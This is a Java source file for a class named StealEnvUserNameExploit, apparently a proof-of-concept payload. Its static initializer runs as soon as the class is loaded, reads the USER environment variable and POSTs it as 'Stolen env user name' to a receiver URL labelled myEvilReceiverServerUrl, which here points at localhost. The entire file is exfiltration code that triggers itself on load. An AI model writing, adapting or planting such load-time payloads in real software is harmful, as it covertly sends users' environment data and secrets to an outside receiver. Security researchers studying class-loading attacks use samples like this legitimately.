import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;

public class StealEnvUserNameExploit {
    static {
        var myEvilReceiverServerUrl = "http://localhost:8001";
        var request = HttpRequest.newBuilder()
                .uri(URI.create(myEvilReceiverServerUrl))
                .header("Content-Type", "application/json")
                .POST(BodyPublishers.ofString("Stolen env user name =  " + System.getenv().get("USER"), StandardCharsets.UTF_8))
                .build();

        try {
            HttpClient.newHttpClient().send(request, BodyHandlers.discarding());
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
